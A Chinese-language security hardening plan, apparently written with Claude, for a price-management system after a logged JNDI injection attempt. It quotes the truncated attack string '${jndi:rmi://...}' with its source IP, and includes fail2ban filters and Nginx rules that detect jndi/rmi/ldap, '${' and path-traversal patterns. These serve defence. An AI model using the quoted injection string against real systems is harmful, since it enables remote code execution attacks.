# 价格管理系统安全增强与异常审计方案

## Context

2026-06-16 通过 v2.1.0 部署后的 [ops-check skill](../dev/../dev/../.claude/skills/ops-check/skill.md) 体检发现，
生产环境后端日志存在 **1 条 JNDI 注入攻击尝试** 与 1 条非法 HTTP header 解析错误。
来源 IP `183.47.120.213` 尝试 `${jndi:rmi://183.47.120.213:1099/bypass...}` 注入攻击。

系统当前已正确拒绝了攻击（Tomcat 默认拒绝非法字符，未造成实际损害），
但**未主动记录、告警、封禁**。同时生产环境存在以下结构性风险：

| 风险编号 | 等级 | 风险描述 | 现状 |
|---|---|---|---|
| S-01 | 🔴 高 | 端口 3306（MySQL）/ 6379（Redis）/ 8082（Harbor）公网监听 | docker-proxy 全部 0.0.0.0，未限制源 IP |
| S-02 | 🔴 高 | 无主动 WAF / fail2ban，被动靠 Tomcat 默认拒绝 | 无主动封禁机制 |
| S-03 | 🟡 中 | 异常请求只写后端日志，无集中数据库记录 | 日志可被滚动覆盖 |
| S-04 | 🟡 中 | 无管理员可视化界面查看异常/审计 | 必须 SSH 到服务器看日志 |
| S-05 | 🟡 中 | 端口 22（SSH）/ 631（CUPS 打印）公网开放 | 攻击面扩大 |
| S-06 | 🟢 低 | Spring Security 缺少统一异常映射 | 异常直接吐 stack 给前端 |
| S-07 | 🟢 低 | 无敏感操作二次验证 | 改密码、删用户等高风险操作可单步完成 |

本方案对当前项目实施**5 层防御 + 1 个管理员门户**：
- 1 层：网络层端口最小化
- 2 层：WAF 层（fail2ban 主动封禁）
- 3 层：网关层（Nginx 黑名单 + 频率限制）
- 4 层：应用层（Spring Security 拦截器 + 异常脱敏）
- 5 层：数据层（全量审计 + 异常存库）
- 管理员门户：可视化查看异常 + 决策响应

**目标**：让 2026-06-16 那种攻击尝试**自动入库**、**自动封禁**、**管理员可查可处理**。

---

## 设计原则

1. **纵深防御**：5 层任意一层失守，其他层仍能拦截
2. **不依赖外部**：告警走"数据库 + 管理员页面"，不依赖钉钉/邮件（避免告警被劫持）
3. **不影响正常用户**：频率限制阈值基于业务量设置
4. **可灰度**：所有规则可配置，关闭不影响核心业务
5. **可审计**：所有"封禁/解封/审计查看"操作本身也被审计

---

## 状态总览

- `[x]`：已完成
- `[ ]`：未完成
- `[部分]`：主体完成，仍有改进空间

| 整改批次 | 状态 | 说明 |
|---|---|---|
| 1 层 网络端口最小化 | [ ] | S-01/S-05 |
| 2 层 fail2ban WAF | [ ] | S-02 |
| 3 层 Nginx 黑名单 | [ ] | S-02 补充 |
| 4 层 Spring Security 拦截器 | [ ] | S-06 |
| 4 层 异常脱敏与映射 | [ ] | S-06 |
| 5 层 异常存库（security_event） | [ ] | S-03 |
| 5 层 全量审计（operation_log 强化） | [ ] | S-07 |
| 管理员门户 异常列表 | [ ] | S-04 |
| 管理员门户 IP 封禁管理 | [ ] | S-04 |
| 数据库迁移 V47 | [ ] | 支撑上面所有数据层改动 |

---

## 整改批次详情

### 批次 1：网络层端口最小化

**目标**：S-01 / S-05。MySQL/Redis/Harbor 只监听 127.0.0.1，公网不可达。

#### 1.1 MySQL 改为仅本地

当前 docker-compose.yml：
```yaml
ports:
  - "3306:3306"   # 监听 0.0.0.0
```

改为：
```yaml
ports:
  - "127.0.0.1:3306:3306"   # 只监听 127.0.0.1
```

#### 1.2 Redis 改为仅本地

`network_mode: host` 时 Redis 默认监听 0.0.0.0。
改为：限制 redis bind 到 127.0.0.1。

**实施方案 A**（推荐，改 compose）：
- 删除 `network_mode: host`，改用 `ports: 127.0.0.1:6379:6379`
- 同步修改后端环境变量 `REDIS_HOST=127.0.0.1`（保持不变，已是 127.0.0.1）

**实施方案 B**（备选，改 redis 启动命令）：
- 启动命令加 `--bind 127.0.0.1`

#### 1.3 Harbor 改为仅本地

Harbor 监听 8082 端口（HTTP 镜像推送用）。如果生产服务器有公网 IP，8082 应只监听 127.0.0.1。
如果其他开发机器需要 push，则需要 VPN/SSH 隧道。

**决策点**（需用户确认）：
- 方案 1：仅本地（push 走 SSH 隧道）
- 方案 2：内网网段白名单（如 `10.7.5.0/24`）

#### 1.4 SSH 限源 + 关闭 CUPS

**SSH 限源**：
- 编辑 `/etc/ssh/sshd_config`，添加 `AllowUsers root@10.7.5.*`
- 或在 iptables 限制 22 端口源 IP

**关闭 CUPS**：
- `systemctl disable cups && systemctl stop cups`

---

### 批次 2：fail2ban WAF 主动封禁

**目标**：S-02。基于日志自动封禁异常 IP。

#### 2.1 安装 fail2ban

```bash
apt install fail2ban
```

#### 2.2 配置 jail

`/etc/fail2ban/jail.local`：

```ini
[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5
banaction = iptables-multiport

[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3

[nginx-jndi]
enabled = true
port = http,https,32080,32801
filter = nginx-jndi
logpath = /var/lib/docker/containers/*/price-management-frontend*.log
maxretry = 1
bantime = 86400   # JNDI 攻击 24h 封禁

[nginx-404]
enabled = true
port = http,https,32080,32801
filter = nginx-404
logpath = /var/lib/docker/containers/*/price-management-frontend*.log
maxretry = 20
findtime = 60
bantime = 600
```

#### 2.3 过滤器定义

`/etc/fail2ban/filter.d/nginx-jndi.conf`：
```ini
[Definition]
failregex = ^.*"(GET|POST) [^"]*(jndi|rmi|ldap|\\\\\$\{)[^"]*HTTP.*"$
ignoreregex =
```

`/etc/fail2ban/filter.d/nginx-404.conf`：
```ini
[Definition]
failregex = ^.*"(GET|POST) [^"]*HTTP[^"]*" 404 .*$
ignoreregex = ^.*"(GET|POST) /(favicon.ico|robots.txt).*$
```

---

### 批次 3：Nginx 网关层

**目标**：S-02 补充。在 nginx.conf 主动封禁 + 限流。

#### 3.1 黑名单 IP

`nginx.conf` 中：
```nginx
# 已知恶意 IP（自动同步自 fail2ban）
include /etc/nginx/conf.d/blocked_ips.conf;
```

`blocked_ips.conf` 由 fail2ban action 自动写入。

#### 3.2 频率限制

```nginx
# 全局限流：每秒 50 请求
limit_req_zone $binary_remote_addr zone=global:10m rate=50r/s;

# 登录端点限流：每秒 5 请求
limit_req_zone $binary_remote_addr zone=login:10m rate=5r/s;

server {
    location / {
        limit_req zone=global burst=100 nodelay;
    }
    location /api/auth/login {
        limit_req zone=login burst=10 nodelay;
        # 失败 5 次锁 10 分钟（在应用层实现）
    }
}
```

#### 3.3 已知攻击特征拒绝

```nginx
location / {
    # 拒绝 JNDI/LDAP/RMI 注入
    if ($args ~* "(jndi|rmi|ldap|log4j)") { return 444; }
    if ($request_uri ~* "(\$\{|%24%7B)") { return 444; }
    if ($request_uri ~* "(\.\./|\.\.\\)") { return 444; }  # 路径穿越
}
```

---

### 批次 4：Spring Security 应用层

**目标**：S-06。统一异常映射 + 敏感信息脱敏。

#### 4.1 异常事件入队

创建 `SecurityEventService`：
- 拦截 `HttpRequestMethodNotSupportedException`、`AccessDeniedException`、Tomcat 抛出的非法字符异常
- 入 `security_event` 表（见批次 5）

#### 4.2 全局异常处理强化

修改 `GlobalExceptionHandler`：
- 不直接返回 stack 给前端
- 统一响应 `Result.error(403, "请求包含非法字符")`
- **记录到 `security_event` 表**

#### 4.3 异常入队过滤器

创建 `SecurityEventFilter`：
- 拦截所有 4xx/5xx 响应
- 异步写入 `security_event` 表

```java
@Component
public class SecurityEventFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(...) {
        // 包装 response，记录 status >= 400 的请求
    }
}
```

#### 4.4 频率限制（应用层兜底）

使用 Bucket4j 或 Resilience4j：
- 全局：每秒 50 请求（与 nginx 一致）
- 登录：每分钟 10 次
- 密码修改：每小时 5 次

---

### 批次 5：数据层 — 异常存库 + 全量审计

**目标**：S-03。Flyway V47 新增 2 张表 + 强化 operation_log。

#### 5.1 新增 security_event 表

`V47__security_event_and_audit_enhancement.sql`：

```sql
-- 1. 安全事件表（攻击尝试、异常请求、IP 封禁记录）
CREATE TABLE IF NOT EXISTS security_event (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    event_type VARCHAR(50) NOT NULL COMMENT '事件类型: ATTACK_BLOCKED, SUSPICIOUS_REQUEST, IP_BANNED, IP_UNBANNED, LOGIN_FAILED_BRUTE_FORCE, PERMISSION_DENIED',
    severity VARCHAR(20) NOT NULL DEFAULT 'INFO' COMMENT '严重等级: INFO, WARN, ERROR, CRITICAL',
    source_ip VARCHAR(45) COMMENT '来源 IP（支持 IPv6）',
    user_agent VARCHAR(500) COMMENT 'User-Agent',
    request_method VARCHAR(10) COMMENT 'GET/POST/PUT/DELETE',
    request_uri VARCHAR(500) COMMENT '请求 URI',
    request_params TEXT COMMENT '请求参数（脱敏后）',
    status_code INT COMMENT 'HTTP 状态码',
    description VARCHAR(1000) COMMENT '事件描述',
    user_id BIGINT COMMENT '关联用户 ID（如果已登录）',
    username VARCHAR(50) COMMENT '关联用户名（如果已登录）',
    action_taken VARCHAR(200) COMMENT '已采取的措施',
    resolved BOOLEAN DEFAULT FALSE COMMENT '是否已处理',
    resolved_by BIGINT COMMENT '处理人 ID',
    resolved_at DATETIME COMMENT '处理时间',
    resolution_note VARCHAR(500) COMMENT '处理说明',
    created_time DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_event_type (event_type),
    INDEX idx_source_ip (source_ip),
    INDEX idx_severity (severity),
    INDEX idx_created_time (created_time),
    INDEX idx_resolved (resolved)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='安全事件表';

-- 2. IP 封禁表（自动 + 手动）
CREATE TABLE IF NOT EXISTS ip_blacklist (
    id BIGINT AUTO_INCREMENT PRIMARY KEY,
    ip_address VARCHAR(45) NOT NULL UNIQUE COMMENT '被封 IP',
    reason VARCHAR(200) NOT NULL COMMENT '封禁原因',
    banned_by VARCHAR(20) NOT NULL DEFAULT 'AUTO' COMMENT '封禁来源: AUTO_FAIL2BAN, AUTO_NGINX, MANUAL_ADMIN',
    banned_at DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
    expires_at DATETIME COMMENT '过期时间（NULL = 永久）',
    is_active BOOLEAN DEFAULT TRUE COMMENT '是否生效',
    banned_by_user_id BIGINT COMMENT '人工封禁的管理员 ID',
    unban_at DATETIME COMMENT '解封时间',
    unban_by_user_id BIGINT COMMENT '解封人 ID',
    unban_reason VARCHAR(200) COMMENT '解封原因',
    created_time DATETIME DEFAULT CURRENT_TIMESTAMP NOT NULL,
    updated_time DATETIME DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    INDEX idx_ip (ip_address),
    INDEX idx_active (is_active),
    INDEX idx_expires (expires_at)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COMMENT='IP 黑名单';

-- 3. operation_log 表增强（添加 source_ip + user_agent + 风险评分）
ALTER TABLE operation_log
    ADD COLUMN source_ip VARCHAR(45) COMMENT '来源 IP',
    ADD COLUMN user_agent VARCHAR(500) COMMENT 'User-Agent',
    ADD COLUMN risk_score INT DEFAULT 0 COMMENT '风险评分（0-100）',
    ADD INDEX idx_risk_score (risk_score),
    ADD INDEX idx_source_ip_2 (source_ip);
```

#### 5.2 Entity / DTO / Service

- `entity/SecurityEvent.java`
- `entity/IpBlacklist.java`
- `repository/SecurityEventRepository.java`
- `repository/IpBlacklistRepository.java`
- `service/SecurityEventService.java`
- `service/IpBlacklistService.java`
- `dto/SecurityEventDTO.java`
- `dto/IpBlacklistDTO.java`

#### 5.3 IP 封禁自动同步

`IpBlacklistSyncService`：
- 定时（每 5 分钟）从 `ip_blacklist` 表读 active 的 IP
- 写入 nginx `blocked_ips.conf` 并 reload
- 同步给 fail2ban（通过 `fail2ban-client set <jail> banip/unbanip`）

#### 5.4 全量审计强化

修改 `OperationLogHelper`：
- 自动记录 `source_ip` 和 `user_agent`（从 `HttpServletRequest` 获取）
- 计算 `risk_score`（基于操作类型 + 频率 + 用户角色）

#### 5.5 异常脱敏

复用现有 `SensitiveDataMasker`：
- `request_params` 中 `password`/`token`/`secret` 自动替换为 `***`
- `description` 中如有 SQL 关键字或 URL 自动摘要

---

### 批次 6：管理员门户 — 异常与封禁管理

**目标**：S-04。可视化查看和处理。

#### 6.1 新增页面（前端 H5）

`frontend/src/views/SecurityCenter.vue`：
- Tab 1：安全事件列表（分页、按 severity/event_type/resolved 过滤）
- Tab 2：IP 黑名单管理（active 列表、history 列表、手动封禁/解封）
- Tab 3：审计日志（基于 operation_log 增强）
- Tab 4：系统健康（调用 ops-check skill 一样的 10 项）

#### 6.2 新增 API

```
GET    /api/admin/security/events?page=&size=&severity=&event_type=&resolved=
GET    /api/admin/security/events/{id}
PATCH  /api/admin/security/events/{id}   # 标记 resolved + 备注
GET    /api/admin/security/blacklist?active=true
POST   /api/admin/security/blacklist      # 手动封禁
DELETE /api/admin/security/blacklist/{id} # 解封
GET    /api/admin/audit/operations?user_id=&risk_score_min=
```

#### 6.3 权限

所有 `/api/admin/security/**` 端点要求 `hasRole('ADMIN')`。
操作本身也进 `operation_log`。

#### 6.4 仪表盘

管理员首页显示：
- 过去 24h 安全事件数
- 未处理事件数（需关注）
- 当前 active 黑名单数
- 风险评分 top 5 用户

---

## 关键参考文件

实施时需参考以下文件：

| 类别 | 文件 | 用途 |
|---|---|---|
| Spring Security | `backend/src/main/java/com/pricemanagement/config/SecurityConfig.java` | 安全配置 |
| 全局异常 | `backend/src/main/java/com/pricemanagement/config/GlobalExceptionHandler.java` | 异常处理 |
| 操作日志 | `backend/src/main/java/com/pricemanagement/util/OperationLogHelper.java` | 日志工具 |
| 敏感脱敏 | `backend/src/main/java/com/pricemanagement/util/SensitiveDataMasker.java` | 数据脱敏 |
| 现有 Flyway | `backend/src/main/resources/db/migration/V46__*.sql` | 迁移模式 |
| 现有审计 | `docs/dev/CLAUDE.md` §操作日志记录规范 | 审计规范 |
| 部署 | `.claude/skills/deploy/skill.md` §6.3 daemon 损坏恢复 | 部署相关 |
| 运维体检 | `.claude/skills/ops-check/skill.md` | 后续自动巡检 |

---

## 实现步骤（推荐顺序）

1. **数据库先行**：创建 V47 迁移脚本（仅 SQL，不动 Java）
2. **后端实体层**：Entity / Repository / DTO
3. **后端服务层**：SecurityEventService / IpBlacklistService
4. **后端拦截器**：SecurityEventFilter（拦截异常请求）
5. **后端 Controller**：AdminSecurityController
6. **现有代码增强**：GlobalExceptionHandler / OperationLogHelper
7. **前端 H5 页面**：SecurityCenter.vue + 路由
8. **Nginx 配置**：限流 + 攻击特征拒绝
9. **fail2ban 安装配置**
10. **端口限制**：docker-compose.yml + redis bind
11. **IP 同步服务**：IpBlacklistSyncService
12. **测试**：单元测试 + 集成测试
13. **部署到生产**（按 deploy skill）
14. **运维验证**：用 ops-check skill 体检

---

## 验证方式

### 功能验证

- [ ] V47 迁移在生产环境成功执行（flyway_schema_history.version=47）
- [ ] security_event 表存在并能写入
- [ ] 后端日志中 JNDI 攻击请求自动入库
- [ ] 管理员页面能看到 security_event 列表
- [ ] 管理员手动封禁一个 IP 后，该 IP 访问被 444 拒绝
- [ ] 管理员解封后恢复访问
- [ ] fail2ban 自动封禁 1 个测试 IP

### 性能验证

- [ ] security_event 异步写入不阻塞正常请求（P99 增加 < 10ms）
- [ ] nginx 限流不误杀正常用户（峰值测试）

### 安全验证

- [ ] 模拟 JNDI 注入：被 4xx 拒绝 + 自动入库
- [ ] 模拟 SQL 注入：被拦截
- [ ] 模拟频繁 404：触发 fail2ban 封禁
- [ ] MySQL/Redis/Harbor 不再公网监听

---

## 风险与回滚

| 风险 | 缓解 |
|---|---|
| V47 迁移失败导致生产启动失败 | 迁移前备份数据库；脚本幂等（IF NOT EXISTS）|
| 限流误杀正常用户 | 阈值保守（50 r/s 全局、5 r/s 登录），监控一周后调整 |
| fail2ban 误封内部 IP | 白名单 `/etc/fail2ban/jail.local` ignoreip |
| 端口限制导致 push 失败 | Harbor 改 127.0.0.1 后，push 走 SSH 隧道 |
| 管理员页面性能问题 | security_event 分区表（按月）|

**回滚方案**：
- V47 迁移：`mysqldump` 备份后 `mysql < backup.sql` 回滚
- 端口：恢复 compose 配置 + `docker compose up -d`
- fail2ban：`fail2ban-client unban --all` + 卸载

---

## 不在本方案范围

- WAF 专业版（如 ModSecurity、Cloudflare）— 成本/复杂度高
- DDoS 防护（CDN 层）— 不在项目控制范围
- 内部用户行为分析（UEBA）— 需要 AI 能力
- 客户端加密（端到端）— 超出业务需求

---

*方案版本: v1.0*
*最后更新: 2026-06-16*
*作者: Claude (基于 v2.1.0 部署实战 + ops-check 体检发现)*
